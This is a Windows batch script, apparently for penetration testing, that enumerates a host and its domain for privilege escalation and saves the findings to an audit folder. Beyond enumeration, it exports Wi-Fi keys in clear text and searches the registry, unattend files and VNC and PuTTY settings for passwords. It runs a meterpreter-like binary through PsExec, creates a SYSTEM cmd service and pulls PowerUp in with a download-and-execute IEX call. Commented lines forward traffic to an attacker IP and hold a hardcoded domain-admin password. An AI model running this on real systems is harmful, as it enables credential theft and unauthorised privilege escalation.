@echo off

REM Author: Gilles Biagomba
REM Program: wind0z_Pr1v3sc.bat
REM Description: This script is designed to perform windows checks for privilege escalation
REM Ref: https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
REM http://pwnwiki.io/#!privesc/windows/index.md
REM https://hackmag.com/security/elevating-privileges-to-administrative-and-further/
REM https://github.com/nixawk/pentest-wiki/blob/master/4.Post-Exploitation/Windows_ActiveDirectory/Windows_AD_commands.md
REM http://pwnwiki.io/#!privesc/windows/uac.md
REM https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

REM Setting up work directory
echo "Setting up work directory"
mkdir %HOMEPATH%\Downloads\%computername%-SAS_Audit\

REM downloading dependencies
echo "REM downloading dependencies"
bitsadmin /transfer n "https://download.sysinternals.com/files/PSTools.zip"
REM bitsadmin /transfer n "https://github.com/silentsignal/wpc/archive/refs/heads/wpc-2.0.zip"
REM bitsadmin /transfer n "https://github.com/pentestmonkey/windows-privesc-check/archive/refs/heads/master.zip"
jar xf PSTools.zip
REM jar xf wpc-2.0.zip
REM jar xf master.zip
echo

REM Basics
echo "Basic Enumeration of the System"
systeminfo >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_systeminfo.txt
hostname >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_systeminfo.txt
echo

REM Who am I?
echo "Obtainting whoami"
whoami >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_whoami.txt
echo %username% >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_whoami.txt
whoami /priv >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_whoami.txt
whoami /groups >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_whoami.txt
whoami /all >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_whoami.txt
echo

REM What users/localgroups are on the machine?
echo "What users/localgroups are on the machine?"
net user administrator >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_usr-grp.txt
net user admin >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_usr-grp.txt
net user %USERNAME% >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_usr-grp.txt
net user >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_usr-grp.txt
net user /domain >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_usr-grp.txt
net users >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_usr-grp.txt
net localgroup >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_usr-grp.txt
net group /domain >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_usr-grp.txt
echo

REM Pulls list of running services off the machine
echo Gathering list of services on the machine...3/8
net start >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_Services.txt

REM Additional net comments
echo "Running additional net commands"
net view >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
net view /domain >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
net view /domain:Cable >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
net view \\domain-control >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
net localgroup administrators >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
net localgroup administrators /domain >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
net group /domain >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
net group "Domain Admins" /domain >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
net group "Domain Computers" /domain >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
net group "Domain Controllers" /domain >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
net group "Group Policy Creator Owners" /domain >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
net time /domain >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
net config >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
net session >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
net use \\ip\ipc$ password /user:Administrator >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
net share >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
net accounts >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
net accounts /domain >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
echo

REM Network
echo "Basic network info"
ipconfig /all >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_network.txt
ipconfig /displaydns >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_network.txt
route print >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_network.txt
arp -A >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_network.txt
echo

REM Show connections
echo "Showing Connections"
netstat -ano >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_network-connections.txt
netstat -ano -p tcp >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_network-connections.txt
netstat -ano -p udp >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_network-connections.txt
echo

REM Firewall
echo "Showing firewall information"
netsh firewall show state >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_network-firewall.txt
netsh firewall show config >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_network-firewall.txt
echo

REM more fw & networking
echo "Showing more firewall & network info"
netsh firewall show conf >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_network-firewall.txt
REM netsh firewall set service type = remotedesktop mode = enable
REM netsh firewall add allowedprogram C:\nltest.exe mltest enable
REM netsh firewall add portopening tcp 2482 lt enable all
REM netsh int portproxy v4tov4 listenport=80 connecthost=[AttackerIP] connectport=80
netsh wlan show profiles >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_network-wireless.txt
netsh wlan export profile folder=. key=clear >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_network-wireless.txt
REM netsh wlan set hostednetwork mode=[allow\|disallow]
REM netsh wlan set hostednetwork ssid=<ssid> key=<passphrase> keyUsage=persistent\|temporary
REM netsh wlan [start|stop] hostednetwork
echo

REM How well patched is the system?
echo "How well patched is the system"
wmic qfe get Caption,Description,HotFixID,InstalledOn >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_Installed_Patches.txt
echo

REM Poll DC
nltest /DCLIST:cable >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_polling-dc.txt
nltest /DCNAME:cable >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_polling-dc.txt
nltest /DSGETDC:cable >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_polling-dc.txt

REM using more vmic commands
echo "Using more vmic commands"
REM wmic useraccount
REM wmic useraccount LIST FULL
REM wmic useraccount LIST BRIEF
REM wmic useraccount LIST STATUS
REM wmic startup
REM wmic share
REM wmic service
REM wmic process where name="[PROCESS]" call terminate
REM wmic process where ProcessId="[PID]" call terminate
REM wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create "cmd /c vssadmin list shadows 2>&1 > c:\temp\output.txt"
REM wmic qfe get hotfixid
REM wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber
REM wmic bios
REM wmic bios LIST FULL
REM wmic volume LIST BRIE
echo

REM Shows information about processes locally
echo "Shows information about processes locally "
qprocess * /SERVER:%COMPUTERNAME% >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_local_processes.txt
echo

REM Searching scheduled Tasks
echo "Searching scheduled Tasks"
tasklist /V >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_scheduled_tasks.txt
tasklist /M >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_scheduled_tasks.txt
tasklist /FI "IMAGENAME eq cmd.exe" >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_scheduled_tasks.txt
tasklist /FI "PID eq 4060" >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_scheduled_tasks.txt
schtasks /query /fo LIST /v  >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_scheduled_tasks.txt
echo

REM VNC
echo "Querying the registry - VNC"
reg query "HKCU\Software\ORL\WinVNC3\Password" >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_vnc_passwords.txt
echo

REM Windows autologin
echo "Querying the registry - autologin"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_autologon.txt
echo

REM SNMP Parameters
echo "Querying the registry - SNMP"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_snmp.txt
echo

REM Putty
echo "Querying the registry - PuTTY"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_putty.txt
echo

REM AlwaysInstallElevated
echo "Querying the registry - AlwaysInstallElevated"
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_AlwaysInstallElevated.txt
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_AlwaysInstallElevated.txt
echo

REM Search for password in registry
echo "Querying the registry - Passwords"
FOR %%s_name IN  api ari aws bearer crypt key pass secret token ey DO (
 reg query HKLM /f  %%s_name /t REG_SZ /s >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
 reg query HKCU /f  %%s_name /t REG_SZ /s >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
)
echo

REM Service only available from inside
echo "Service only available from inside"
netstat -ano >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_services.txt
echo

REM Weak Service Permissions
echo "Weak Service Permissions"
wmic service list brief
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %aschtasks /query /fo LIST /v  >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_permissions.txt
for /f eol^=^"^ delims^=^" %a in (%HOMEPATH%/Downloads/%computername%-SAS_Audit/%computername%_permissions.txt) do cmd.exe /c icacls "%a" >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_weak_permissions.txt
echo

REM sc.exe
echo "Using the service controller"
sc query >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_service-controller.txt
sc qc service name >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_service-controller.txt
sc query state= all | findstr "SERVICE_NAME:" >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_Servicenames.txt
FOR /F %i in (%HOMEPATH%/Downloads/%computername%-SAS_Audit/%computername%_Servicenames.txt) DO echo %i
FOR /F "tokens=2 delims= " %i in (%HOMEPATH%/Downloads/%computername%-SAS_Audit/%computername%_Servicenames.txt) DO @echo %i >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_services.txt
FOR /F %i in (%HOMEPATH%/Downloads/%computername%-SAS_Audit/%computername%_services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_path.txt
sc create cmdsys type= own type= interact binPath= "c:\windows\system32\cmd.exe /c cmd.exe" & sc start cmdsys >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_cmdsys.txt
echo

REM Migrate the meterpreter shell
echo "Migrate the meterpreter shell"
wmic process list brief | find "winlogon"
echo

REM Using WMIC
echo "Find Services With Unquoted Paths"
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
echo

REM How to search such directories/ files
echo "search such directories/ files"
accesschk.exe -uwdqs users c:\ >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_search-dir.txt
accesschk.exe -uwdqs “Authenticated Users” c:\ >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_search-dir.txt
accesschk.exe -uwqs users c:\*.* >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_search-dir.txt
accesschk.exe -uwqs “Authenticated Users” c:\*.* >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_search-dir.txt
accesschk.exe –uwcqv * >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_search-dir.txt
echo

REM Ssearch for process Permissions
echo "Ssearch for process Permissions"
cd %ProgramFiles%
dir  /s /b *.exe | findstr /v .exe >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_process.txt
FOR /F %%G IN ('"dir  /s /b *.exe | findstr /v .exe."') DO icacls "%%G" >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_process.txt
FOR /F %%G IN ('"dir  /s /b *.exe | findstr /v .exe."') DO cacls "%%G" >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_process.txt
icacls config\SAM >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_process.txt
echo "Look for Binary_path_name and see if it is unquoted."
echo

REM List all drivers
echo "Vulnerable Drivers"
driverquery >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_vulnerable_drivers.txt
echo

REM Lost auto launch
REM echo "Lost auto launch"
REM autorunsc.exe -a | findstr /n /R "File\ not\ found"
echo

REM Using PsTools
%HOMEPATH%/Downloads/PsExec.exe \\%COMPUTERNAME% -accepteula -c -f -h -d metr.exe
%HOMEPATH%/Downloads/PsLoggedon.exe \\%COMPUTERNAME% 2>NUL | find "gbiago909" >NUL
echo

REM Misc
echo "Script included gathers data about the system and stores output in files in the"
c:\windows\system32\gathernetworkinfo.vbs
echo

REM PUlling GPO
echo ": Extremely verbose output of GPO (Group policy) settings as applied to the current system and user"
gpresult /z /r /f >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_gpo_policy.txt
gpresult /h %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_gpo_policy.html

REM Printing ENV VAR
echo "Printing environment variables"
powerShell "Get-ChildItem Env: | ft Key,Value" >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_env-var.txt

REM PowerUp
echo "PowerUp"
powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks

REM AppLocker Enumeration
echo "List AppLocker rules"
powershell "Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections" >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_applocker.txt

REM Search for them
echo "Cleartext Passwords"
cd C:\
findstr /si password *.txt >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
findstr /si password *.xml >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
findstr /si password *.ini >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
findstr /si password *.config >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
echo

REM Find all those strings in config files.
echo "Find all those strings in config files"
dir /s *pass* == *cred* == *vnc* == *.config* >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
echo

REM Find all passwords in all files.
echo "Find all passwords in all files"
findstr /spin "password" *.* >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
findstr /spin "password" *.* >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
echo

REM More passwords In files
echo "More passwords In files"
type c:\sysprep.inf >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
type c:\sysprep\sysprep.xml >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
type c:\unattend.xml >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
type %WINDIR%\Panther\Unattend\Unattended.xml >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
type %WINDIR%\Panther\Unattended.xml >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
dir c:\*vnc.ini /s /b >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
dir c:\*ultravnc.ini /s /b >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
dir c:\ /s /b | findstr /si *vnc.ini >> %HOMEPATH%\Downloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
echo

REM gift wrapping results
REM if exist C:\Windows\System32\tar.exe (tar -czvf %HOMEPATH%\Downloads\%computername%-SAS_Audit.tar.bz %HOMEPATH%\Downloads\%computername%-SAS_Audit\) else (powershell Compress-Archive %HOMEPATH%\Downloads\%computername%-SAS_Audit\ %HOMEPATH%\Downloads\%computername%-SAS_Audit.zip)
powershell Install-Module -Name Microsoft.PowerShell.Archive
powershell Compress-Archive -Path %HOMEPATH%\Downloads\%computername%-SAS_Audit -DestinationPath %HOMEPATH%\Downloads\%computername%-SAS_Audit.zip -CompressionLevel Optimal
REM rd /s /q %HOMEPATH%\Downloads\%computername%-SAS_Audit\
explorer %HOMEPATH%\Downloads\

REM La fin
echo "All done!"
